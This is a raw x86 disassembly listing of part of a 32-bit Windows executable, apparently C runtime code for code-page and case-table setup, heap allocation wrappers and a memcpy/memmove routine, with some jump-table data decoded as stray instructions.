  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
